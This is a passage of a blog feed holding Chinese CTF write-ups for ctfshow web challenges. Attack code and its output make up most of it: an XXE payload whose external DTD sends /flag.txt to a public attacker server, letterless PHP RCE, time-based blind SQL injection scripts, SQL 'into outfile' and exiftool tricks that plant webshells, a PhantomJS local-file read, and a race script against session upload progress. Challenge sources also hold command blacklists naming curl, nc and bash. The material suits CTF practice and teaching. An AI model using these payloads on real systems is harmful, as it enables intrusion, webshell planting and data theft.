requests.get(u)\n        t = r.text\n        if(\"I asked nothing\" in t):\n            flag += chr(j)\n            print(flag)\n            break\n</code></pre>\n<h2 id=\"web3-观图\"><a href=\"#web3-观图\" class=\"headerlink\" title=\"web3_观图\"></a>web3_观图</h2><pre><code class=\"php\">&lt;?php\n\n//$key = substr(md5('ctfshow'.rand()),3,8);\n//flag in config.php\ninclude('config.php');\nif(isset($_GET['image'])){\n    $image=$_GET['image'];\n    $str = openssl_decrypt($image, 'bf-ecb', $key);\n    if(file_exists($str)){\n        header('content-type:image/gif');\n        echo file_get_contents($str);\n    }\n}else{\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<p><code>?image=N6bf8Bd8jm0SpmTZGl0isw==</code></p>\n<h2 id=\"web4-观心\"><a href=\"#web4-观心\" class=\"headerlink\" title=\"web4_观心\"></a>web4_观心</h2><p>点击占卜后可以发现网络模块中多了一个api.php ，查看请求数据，分别提交了api和city </p>\n<p>查阅，为xxe漏洞，在服务器上写两个文件</p>\n<p>test.xml</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; \n\n&lt;!DOCTYPE test [ \n\n&lt;!ENTITY % remote SYSTEM \"http://公网ip+port/test.dtd\"&gt; \n\n%remote;%int;%send; ]&gt;\n</code></pre>\n<p>test.dtd</p>\n<pre><code class=\"dtd\">&lt;!ENTITY % p1 SYSTEM \"php://filter/read=convert-base64.encode/resource=/flag.txt\"&gt;\n&lt;!ENTITY % p2 \"&lt;!ENTITY xxe SYSTEM 'http://ip/pass=%p1;'&gt;\"&gt;\n%p2;\n</code></pre>\n<p>然后访问 api.php</p>\n<p>POST 内容如下</p>\n<pre><code class=\"raw\">api=http:// 公网 ip+port/test.xml&amp;city=\n</code></pre>\n<p>最后可以看到 flag</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/AK%E8%B5%9B_web_%E8%A7%82%E5%BF%83_1.jpg\"></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/26d2b0d0/",
            "url": "http://dpm12345.cn/posts/26d2b0d0/",
            "title": "36D杯",
            "date_published": "2022-10-04T15:22:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"给你-shell\"><a href=\"#给你-shell\" class=\"headerlink\" title=\"给你 shell\"></a>给你 shell</h2><p>进入后查看源码，可以发现标签</p>\n<pre><code class=\"html\">&lt;a href='[./?view_source](http://dc592659-7387-4929-80b9-ebd1efabecf7.challenge.ctf.show/?view_source)' target=\"_blank\"&gt;&lt;button hidden&gt;&lt;/button&gt;&lt;/a&gt;\n</code></pre>\n<p>点击，挑战到源码界面</p>\n<pre><code class=\"php\">&lt;?php\n//It's no need to use scanner. Of course if you want, but u will find nothing.\nerror_reporting(0);\ninclude \"config.php\";\n\nif (isset($_GET['view_source'])) {\n    show_source(__FILE__);\n    die;\n}\n\nfunction checkCookie($s) {\n    $arr = explode(':', $s);\n    if ($arr[0] === '{\"secret\"' &amp;&amp; preg_match('/^[\\\"0-9A-Z]*}$/', $arr[1]) &amp;&amp; count($arr) === 2 ) {\n        return true;\n    } else {\n        if ( !theFirstTimeSetCookie() ) setcookie('secret', '', time()-1);\n        return false;\n    }\n}\n\nfunction haveFun($_f_g) {\n    $_g_r = 32;\n    $_m_u = md5($_f_g);\n    $_h_p = strtoupper($_m_u);\n    for ($i = 0; $i &lt; $_g_r; $i++) {\n        $_i = substr($_h_p, $i, 1);\n        $_i = ord($_i);\n        print_r($_i &amp; 0xC0);\n    }\n    die;\n}\n\nisset($_COOKIE['secret']) ? $json = $_COOKIE['secret'] : setcookie('secret', '{\"secret\":\"' . strtoupper(md5('y1ng')) . '\"}', time()+7200 );\ncheckCookie($json) ? $obj = @json_decode($json, true) : die('no');\n\nif ($obj &amp;&amp; isset($_GET['give_me_shell'])) {\n    ($obj['secret'] != $flag_md5 ) ? haveFun($flag) : echo \"here is your webshell: $shell_path\";\n}\n\ndie;\n</code></pre>\n<p>由该代码可知是为了获得webshell的地址，即要使得<code>$obj['secret'] != $flag_md5</code>为false，但在前后并无发现关于flag的信息，唯一能获取的是即为后面的<code>haveFun($flag)</code>函数，有该函数本体代码，可以知道每一位flag的ascii码值<code>与操作</code>0的值。（这里有个知识点，小于65的数与0为0，64-127与0为64）。而在64-127的ascii里均不为数字，而在MD5值和函数转大写，只有数字和大写字母。所以可根据打印结果判断md5的数据组成。</p>\n<p>在<code>$obj['secret'] != $flag_md5</code>的判断中，为弱等于，所以不用知道<code>flag_md5</code>的全部值，如果flag前几位为数字，可用弱类型比较的特性绕过。于是先随便输入一个<code>secret</code>值，得到</p>\n<pre><code class=\"raw\">0006464640064064646464006406464064640064006400000000000\n</code></pre>\n<p>即flag的md5开头三位为数字，那么传入的secret为一个三位数，可以是判断表达过绕过，进行爆破，可以得到115为正确的</p>\n<p>输入 <code>{\"secret\":115}</code> ，得到</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/ctfshow_1.jpg\"></p>\n<p>即网站 <code>w3b5HeLLlll123.php</code></p>\n<p>进入，源码</p>\n<pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nsession_start();\n\n\n//there are some secret waf that you will never know, fuzz me if you can\nrequire \"hidden_filter.php\";\n\n\nif (!$_SESSION['login'])\n    die('&lt;script&gt;location.href=\\'./index.php\\'&lt;/script&gt;');\n\n\nif (!isset($_GET['code'])) {\n    show_source(__FILE__);\n    exit();\n} else {\n    $code = $_GET['code'];\n    if (!preg_match($secret_waf, $code)) {\n        // 清空 session 从头再来\n        eval(\"\\$_SESSION[\" . $code . \"]=false;\"); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker\n    } else die('hacker');\n}\n\n\n/*\n * When you feel that you are lost, do not give up, fight and move on.\n * Being a hacker is not easy, it requires effort and sacrifice.\n * But remember … we are legion!\n *  ————Deep CTF 2020\n*/\n</code></pre>\n<p>这里可以发现</p>\n<p>过滤了：</p>\n<pre><code class=\"raw\">0       200\tfalse\tfalse\t309\t\t//309 为黑名单里面的符号，但不一定是全部，只是符号\n2\t\"\t200\tfalse\tfalse\t309\t\n4\t$\t200\tfalse\tfalse\t309\t\n6\t&amp;\t200\tfalse\tfalse\t309\t\n7\t'\t200\tfalse\tfalse\t309\t\n8\t(\t200\tfalse\tfalse\t309\t\n9\t)\t200\tfalse\tfalse\t309\t\n10\t*\t200\tfalse\tfalse\t309\t\n15\t/\t200\tfalse\tfalse\t309\t\n18\t;\t200\tfalse\tfalse\t309\t\n25\t\\\t200\tfalse\tfalse\t309\t\n27\t^\t200\tfalse\tfalse\t309\t\n29\t`\t200\tfalse\tfalse\t309\t\n31\t|\t200\tfalse\tfalse\t309\t\n1\t!\t200\tfalse\tfalse\t303\t\n3\t#\t200\tfalse\tfalse\t303\t\n5\t%\t200\tfalse\tfalse\t303\t\n11\t+\t200\tfalse\tfalse\t303\t\n12\t,\t200\tfalse\tfalse\t303\t\n13\t-\t200\tfalse\tfalse\t303\t\n14\t.\t200\tfalse\tfalse\t303\t\n16\t\t200\tfalse\tfalse\t303\t\n17\t:\t200\tfalse\tfalse\t303\t\n19\t&lt;\t200\tfalse\tfalse\t303\t\n20\t=\t200\tfalse\tfalse\t303\t\n21\t&gt;\t200\tfalse\tfalse\t303\t\n22\t?\t200\tfalse\tfalse\t303\t\n23\t@\t200\tfalse\tfalse\t303\t\n24\t[\t200\tfalse\tfalse\t303\t\n26\t]\t200\tfalse\tfalse\t303\t\n28\t_\t200\tfalse\tfalse\t303\t\n30\t{\t200\tfalse\tfalse\t303\t\n32\t}\t200\tfalse\tfalse\t303\t\n33\t~\t200\tfalse\tfalse\t303\t\n————————————————\n版权声明：本文为 CSDN 博主「秋风瑟瑟...」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/qq_45628145/article/details/106291794\n</code></pre>\n<p>利用点为<code>eval(\"\\$_SESSION[\" . $code . \"]=false;\");</code>由<code>eval</code>的特性，可以用分号分割命令，但由于<code>;</code>被过滤，这里采用<code>?&gt;&lt;?</code>代替。所以先闭合<code>[</code>, 即<code>code=]=1</code>之后要读取前面提示的<code>/flag.txt</code> 文件，但由于引号和括号均被过滤，不能使用分号、括号、空格，即不能使用include，那么可以想到用require包含文件，由于可以使用<code>~</code>，那么可以使用该符号取反运算</p>\n<pre><code class=\"php\">&lt;?php\n$a = '/flag.txt';\n$b = urldecode(~$a);\necho urlencode($b);\n</code></pre>\n<p>得到<code>%D0%99%93%9E%98%D1%8B%87%8B</code> 那么 payload: <code>code=]=1?&gt;&lt;?=require~%D0%99%93%9E%98%D1%8B%87%8B?&gt; </code></p>\n<p>提示</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/ctfshow_2.jpg\"># 本文作者： dpm12345 @dpm12345</p>\n<p>于是修改为 /flag</p>\n<p>得到<code>%D0%99%93%9E%98</code></p>\n<p>那么payload:<code>code=]=1?&gt;&lt;?=require~%D0%99%93%9E%98?&gt;</code></p>\n<p>得到flag</p>\n<h2 id=\"RemoteImageDownloader\"><a href=\"#RemoteImageDownloader\" class=\"headerlink\" title=\"RemoteImageDownloader\"></a>RemoteImageDownloader</h2><p>CVE-2019-17221、PhantomJS 任意文件读取</p>\n<p>首先创建<code>html</code>写入以下代码：</p>\n<pre><code class=\"html\">&lt;html&gt;\n &lt;head&gt;\n &lt;body&gt;\n &lt;script&gt;\n x=new XMLHttpRequest;\n x.onload=function(){\n document.write(this.responseText)\n };\n x.open(\"GET\",\"file:///flag\");\n x.send();\n &lt;/script&gt;\n &lt;/body&gt;\n &lt;/head&gt;\n&lt;/html&gt;\n</code></pre>\n<p>再将站点地址输入，点击<code>download</code>，下载了图片，打开后看到 flag</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/romoteImageDownload.png\"></p>\n<h2 id=\"ALL-INFO-U-WANT\"><a href=\"#ALL-INFO-U-WANT\" class=\"headerlink\" title=\"ALL_INFO_U_WANT\"></a>ALL_INFO_U_WANT</h2><p>访问index.php.bak得到源码</p>\n<pre><code class=\"PHP\">visit all_info_u_want.php and you will get all information you want\n\n= =Thinking that it may be difficult, i decided to show you the source code:\n\n\n&lt;?php\nerror_reporting(0);\n\n//give you all information you want\nif (isset($_GET['all_info_i_want'])) {\n    phpinfo();\n}\n\nif (isset($_GET['file'])) {\n    $file = \"/var/www/html/\" . $_GET['file'];\n    //really baby include\n    include($file);\n}\n\n?&gt;\n\n\n\nreally really really baby challenge right?\n</code></pre>\n<p>根据提示访问<code>all_info_u_want.php?all_info_i_want=1</code>,</p>\n<p>之后是文件读取</p>\n<p>通过<code>phpinfo ()</code>可知为 nginx，那么可以使用日志包含写一句话木马进行rce</p>\n<p>查找根目录，发现flag，读取，但是是假的，用以下命令查找</p>\n<pre><code class=\"bash\">find /etc -name \"*\" | xargs grep \"ctfshow\"\n</code></pre>\n<p>找到 flag</p>\n<h2 id=\"WUSTCTF-朴实无华-Revenge\"><a href=\"#WUSTCTF-朴实无华-Revenge\" class=\"headerlink\" title=\"WUSTCTF_朴实无华_Revenge\"></a>WUSTCTF_朴实无华_Revenge</h2><pre><code class=\"php\">&lt;?php\nheader('Content-type:text/html;charset=utf-8');\nerror_reporting(0);\nhighlight_file(__file__);\n\nfunction isPalindrome($str){\n    $len=strlen($str);\n    $l=1;\n    $k=intval($len/2)+1;\n    for($j=0;$j&lt;$k;$j++)\n        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) {\n            $l=0;\n            break;\n        }\n    if ($l==1) return true;\n    else return false;\n}\n\n//level 1\nif (isset($_GET['num'])){\n    $num = $_GET['num'];\n    $numPositve = intval($num);\n    $numReverse = intval(strrev($num));\n    if (preg_match('/[^0-9.-]/', $num)) {\n        die(\"非洲欢迎你1\");\n    }\n    if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) { // 在 64 位系统中 intval () 的上限不是 2147483647 省省吧\n        die(\"非洲欢迎你2\");\n    }\n    if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) ){\n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;\";\n    }else{\n        die(\"金钱解决不了穷人的本质问题\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n\n//level 2\nif (isset($_GET['md5'])){\n    $md5=$_GET['md5'];\n    if ($md5==md5(md5($md5)))\n        echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;\";\n    else\n        die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");\n}else{\n    die(\"去非洲吧\");\n}\n\n//get flag\nif (isset($_GET['get_flag'])){\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \")){\n        $get_flag = str_ireplace(\"cat\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"more\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tail\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"less\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"head\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tac\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"$\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"sort\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"curl\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"nc\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"bash\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"php\", \"36dCTFShow\", $get_flag);\n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;\";\n        system($get_flag);\n    }else{\n        die(\"快到非洲了\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n?&gt;\n</code></pre>\n<p><strong>首先绕过第一个正则</strong></p>\n<p>要为只由数字、点、横杠组成，同时正反序 intval 的值相同，并且不为回文字符串</p>\n<p>这里有两种构造方法</p>\n<p>一是利用浮点数的精度 如<code>100.0010100.0010</code></p>\n<p>二是利用<code>inval</code>的特性截断，如<code>.11.-.11.−</code></p>\n<p><strong>其次是要绕过 md5</strong></p>\n<p>这里用了 md5 碰撞，脚本如下</p>\n<pre><code class=\"python\">import hashlib\n\nfor i in range(0,10**33):\n    i = str(i)\n    num = '0e' + i\n    md5 = hashlib.md5(num.encode()).hexdigest()\n    md5 = hashlib.md5(md5.encode()).hexdigest()\n    # print(md5)\n    if md5[0:2] == '0e' and md5[2:].isdigit():\n        print('success str:{}  md5(str):{}'.format(num, md5))\n        break\n    else:\n        if int(i) % 1000000 == 0:\n        print(i)\n</code></pre>\n<p>之后get_flag可以使用<code>\\</code> 绕过，可以用 <code>%09</code> 绕过空格</p>\n<pre><code class=\"raw\">?get_flag=ca\\t&lt;/flag\n?get_flag=ca\\t%09/flag\n</code></pre>\n<p>或者也可以使用nl写文件</p>\n<h2 id=\"WUSTCTF-朴实无华-Revenge-Revenge\"><a href=\"#WUSTCTF-朴实无华-Revenge-Revenge\" class=\"headerlink\" title=\"WUSTCTF_朴实无华_Revenge_Revenge\"></a>WUSTCTF_朴实无华_Revenge_Revenge</h2><pre><code class=\"raw\">?num=0.00&amp;md5=0e1138100474&amp;get_flag=ta\\c%09flag.p\\hp\n</code></pre>\n<h2 id=\"Login-Only-For-36D\"><a href=\"#Login-Only-For-36D\" class=\"headerlink\" title=\"Login_Only_For_36D\"></a>Login_Only_For_36D</h2><pre><code class=\"python\">from time import sleep\nimport requests\nurl = \"http://621b1844-7d0d-4d4b-b5db-e3dbbccc3b68.challenge.ctf.show/\"\nans = \"\"\nfor i in range(1, 60):\n    for mid in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\":\n        data = {\n            \"username\": \"admin\\\\\",\n            \"password\": 'or/**/if((password/**/regexp/**/binary/**/\"^{}\"),sleep(10),1)#'.format(ans+mid)\n        }\n        # 请求\n        try:\n            response = requests.post(url=url, data=data, timeout=7)\n            sleep(0.3)\n        except:\n            ans += mid\n            print(ans)\n            break\nprint(ans)\n</code></pre>\n<p>过滤了<code>'=</code>空格</p>\n<p><code>regexp</code>注入，时间盲注</p>\n<p>得到密码<code>ILoVeThlrtySixD</code></p>\n<h2 id=\"你取吧\"><a href=\"#你取吧\" class=\"headerlink\" title=\"你取吧\"></a>你取吧</h2><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nshow_source(__FILE__);\n$hint=file_get_contents('php://filter/read=convert.base64-encode/resource=hhh.php');\n$code=$_REQUEST['code'];\n$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','\\~','\\^');\n$blacklist = array_merge($_);\nforeach ($blacklist as $blacklisted) {\n    if (preg_match ('/' . $blacklisted . '/im', $code)) {\n        die('nonono');\n    }\n}\neval(\"echo($code);\");\n?&gt;\n</code></pre>\n<h3 id=\"无字母-rce\"><a href=\"#无字母-rce\" class=\"headerlink\" title=\"无字母 rce\"></a>无字母 rce</h3><h4 id=\"p-神-payload\"><a href=\"#p-神-payload\" class=\"headerlink\" title=\"p 神 payload\"></a>p 神 payload</h4><pre><code class=\"php\">&lt;?php\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);\n</code></pre>\n<h3 id=\"利用原数组构建\"><a href=\"#利用原数组构建\" class=\"headerlink\" title=\"利用原数组构建\"></a>利用原数组构建</h3><pre><code class=\"python\">s=['a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','\\~','\\^']\nword=input()\ncode=''\nfor j in word:\n        if j in s:\n            code+='$_['+str(s.index(j))+'].'\n        else:\n            code+=\"'\"+j+\"'\"+\".\"\nprint(code)\n</code></pre>\n<p>system: <code>$_[18].$_[24].$_[18].$_[19].$_[4].$_[11]</code><br>ls： <code>$_[13].$_[18]</code><br>cat： <code>$_[2].$_[0].$_[19]</code><br>flag: <code>$_[5].$_[13].$_[0].$_[6]</code></p>\n<h4 id=\"第一种\"><a href=\"#第一种\" class=\"headerlink\" title=\"第一种\"></a>第一种</h4><p>ls:</p>\n<pre><code class=\"raw\">?code=`$_[13]$_[18]`\n</code></pre>\n<p>nl /* :</p>\n<pre><code class=\"raw\">?code=`$_[12]$_[13]%20/*`\n</code></pre>\n<h4 id=\"第二种\"><a href=\"#第二种\" class=\"headerlink\" title=\"第二种\"></a>第二种</h4><p>system(‘ls’)</p>\n<pre><code class=\"raw\">?code=1);$__=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___=$_[13].$_[18];$__($___);(1\n得到\n1hhh.php hint.php index.php phpjiami.zip\n</code></pre>\n<p>system(‘ls /‘)</p>\n<pre><code class=\"raw\">?code=1);$__=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___=$_[13].$_[18];$__($___.' /');(1\n得到\n1bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var\n</code></pre>\n<p>system(‘cat /flag’)</p>\n<pre><code class=\"raw\">?code=1);$__=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___=$_[2].$_[0].$_[19].' /'.$_[5].$_[13].$_[0].$_[6];$__($___.' /');(1\n得到flag\n</code></pre>\n<h3 id=\"预期解\"><a href=\"#预期解\" class=\"headerlink\" title=\"预期解\"></a>预期解</h3><p><code>?code=${$_[7].$_[8].$_[12].$_[19]}</code> 读取 hint 文件</p>\n<p>那么即可下载压缩包，但得出来的是一个混淆后的php文件，大佬的解密php脚本：</p>\n<pre><code class=\"php\">function decrypt($data, $key)\n{\n    $data_1 = '';\n    for ($i = 0; $i &lt; strlen($data); $i++) {\n        $ch = ord($data[$i]);\n        if ($ch &lt; 245) {\n            if ($ch &gt; 136) {\n                $data_1 .= chr($ch / 2);\n            } else {\n                $data_1 .= $data[$i];\n            }\n        }\n    }\n    $data_1 = base64_decode($data_1);\n    $key = md5($key);\n    $j = $ctrmax = 32;\n    $data_2 = '';\n    for ($i = 0; $i &lt; strlen($data_1); $i++) {\n        if ($j &lt;= 0) {\n            $j = $ctrmax;\n        }\n        $j--;\n        $data_2 .=  $data_1[$i] ^ $key[$j];\n    }\n    return $data_2;\n}\n\nfunction find_data($code)\n{\n    $code_end = strrpos($code, '?&gt;');\n    if (!$code_end) {\n        return \"\";\n    }\n    $data_start = $code_end + 2;\n    $data = substr($code, $data_start, -46);\n    return $data;\n}\n\nfunction find_key($code)\n{\n    // $v1 = $v2('bWQ1');\n    // $key1 = $v1('??????');\n    $pos1 = strpos($code, \"('\" . preg_quote(base64_encode('md5')) . \"');\");\n    $pos2 = strrpos(substr($code, 0, $pos1), '$');\n    $pos3 = strrpos(substr($code, 0, $pos2), '$');\n    $var_name = substr($code, $pos3, $pos2 - $pos3 - 1);\n    $pos4 = strpos($code, $var_name, $pos1);\n    $pos5 = strpos($code, \"('\", $pos4);\n    $pos6 = strpos($code, \"')\", $pos4);\n    $key = substr($code, $pos5 + 2, $pos6 - $pos5 - 2);\n    return $key;\n}\n\n$input_file = $argv[1];\n$output_file = $argv[1] . '.decrypted.php';\n\n$code = file_get_contents($input_file);\n\n$data = find_data($code);\nif (!$code) {\n    echo '未找到加密数据', PHP_EOL;\n    exit;\n}\n\n$key = find_key($code);\nif (!$key) {\n    echo '未找到秘钥', PHP_EOL;\n    exit;\n}\n\n$decrypted = decrypt($data, $key);\n$uncompressed = gzuncompress($decrypted);\n// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩\nif ($uncompressed) {\n    $decrypted = str_rot13($uncompressed);\n} else {\n    $decrypted = str_rot13($decrypted);\n}\nfile_put_contents($output_file, $decrypted);\necho '解密后文件已写入到 ', $output_file, PHP_EOL;\n</code></pre>\n<p>用法： <code>php 该解密脚本 待解密的php文件</code> ，得到：</p>\n<p><code>@assert($_POST[6]);</code>为一句话木马，蚁剑登陆，连接类型选择 base64</p>\n<h2 id=\"你没见过的注入\"><a href=\"#你没见过的注入\" class=\"headerlink\" title=\"你没见过的注入\"></a>你没见过的注入</h2><p>根据提示查看txt文件，那么必然是robots.txt，输入后可以看到/pwreset.php ，进入为密码重置页面，重置密码为1，登录，发现为文件上传页面</p>\n<p>尝试性地上传txt，jpg 文件，可以看到文件被打包成zip文件，并在后面跟上filetype的判断</p>\n<p>搜索资料，发现为文件类型注入，通过修改图片的 type 来完成注入</p>\n<p>可以猜测语句是<code>insert into file values (“filename”,“filetype”,“fileextra”)</code>，没有作任何过滤，可以写一句话进去</p>\n<p>一般写成16进制形式，避免语句本身的单引号双引号对拼接造成干扰</p>\n<pre><code class=\"sql\">select \"&lt;?=`$_POST[1]`;\" into outfile \"/var/www/html/1.php\";\nselect 0x003c3f3d60245f504f53545b315d603b into outfile \"/var/www/html/1.php\";\n# 其他 eval 应该过滤了，多次上传没有成功\n</code></pre>\n<p>使用exiftool工具</p>\n<pre><code class=\"bash\">exiftool -overwrite_original -comment=\"zhong\\\"');select 0x3c3f3d60245f504f53545b315d603b into outfile \\\"/var/www/html/1.php\\\";\" 1.jpg\n# 分号前面为闭合前面语句\n# 其中 1.jpg 的大小要尽可能的小\n</code></pre>\n<p>上传后，访问1.php。分别输入</p>\n<pre><code class=\"raw\">1=ls\n1=ls /\n1=cat /flag\n得到flag\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/ba492ba4/",
            "url": "http://dpm12345.cn/posts/ba492ba4/",
            "title": "36D杯练手赛",
            "date_published": "2022-10-04T15:20:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"easy-shell\"><a href=\"#easy-shell\" class=\"headerlink\" title=\"easy shell\"></a>easy shell</h2><p>进入后查看源码，看到注释<code>&lt;!--md5($secret.$name)===$pass --&gt;</code></p>\n<p>先随便输入，发现cookie中有hash值<code>de73312423b835b22bfdc3c6da7b63e9</code>，猜测为满足条件的md5值</p>\n<p>于是将该值赋给pass，提交后发现为404，但是此时仔细发现，该页面是一个404.html，于是推测发生了重定向</p>\n<p>尝试bp抓包，得到</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/36Deasy_shell_1.jpg\"></p>\n<p>发现 <code>flflflflag.php</code> 文件，抓包访问，得到</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/36Deasy_shell_2.jpg\"></p>\n<p>发现文件包含，尝试使用伪协议</p>\n<pre><code class=\"raw\">?file=php://filter/convert.base64-encode/resource=index.php\n?file=php://filter/convert.base64-encode/resource=flflflflag.php\n</code></pre>\n<p>base64 解码后得到</p>\n<p>index.php</p>\n<pre><code class=\"php\">&lt;?php\ninclude 'config.php';\n@$name=$_GET['name'];\n@$pass=$_GET['pass'];\nif(md5($secret.$name)===$pass){\n    echo '&lt;script language=\"javascript\" type=\"text/javascript\"&gt;\n           window.location.href=\"flflflflag.php\";\n    &lt;/script&gt;\n';\n}else{\n    setcookie(\"Hash\",md5($secret.$name),time()+3600000);\n    echo \"username/password error\";\n}\n?&gt;\n&lt;html&gt;\n&lt;!--md5($secret.$name)===$pass --&gt;\n&lt;/html&gt;\n</code></pre>\n<p>flflflflag.php</p>\n<pre><code class=\"php\">&lt;html&gt;\n&lt;head&gt;\n&lt;script language=\"javascript\" type=\"text/javascript\"&gt;\n           window.location.href=\"404.html\";\n&lt;/script&gt;\n&lt;title&gt;yesec want Girl friend&lt;/title&gt;\n&lt;/head&gt;\n&lt;&gt;\n&lt;body&gt;\n&lt;?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n    die('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>尝试session文件包含</p>\n<pre><code class=\"python\">import io\nimport sys\nimport requests\nimport threading\n\nhost = 'http://5d6bb0b0-e82d-4a68-b50b-8fd858a7c6ea.chall.ctf.show/flflflflag.php'\nsessid = 'vrhtvjd4j1sd88onr92fm9t2sj'\n\ndef POST(session):\n    while True:\n        f = io.BytesIO(b'a' * 1024 * 50)\n        session.post(\n            host,\n            data={\"PHP_SESSION_UPLOAD_PROGRESS\":\"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');echo md5('1');?&gt;\"},\n            files={\"file\":('a.txt', f)},\n            cookies={'PHPSESSID':sessid}\n        )\n\ndef READ(session):\n    while True:\n        response = session.get(f'{host}?file=/tmp/sess_{sessid}')\n        # print(response.text)\n        if 'c4ca4238a0b923820dcc509a6f75849b' not in response.text:\n        # if 'flag' not in response.text:\n            print('[+++]retry')\n        else:\n            print(response.text)\n            sys.exit(0)\n\n\nwith requests.session() as session:\n    t1 = threading.Thread(target=POST, args=(session, ))\n    t1.daemon = True\n    t1.start()\n    READ(session)\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/f685e8f8/",
            "url": "http://dpm12345.cn/posts/f685e8f8/",
            "title": "单身杯",
            "date_published": "2022-10-04T15:10:32.000Z",
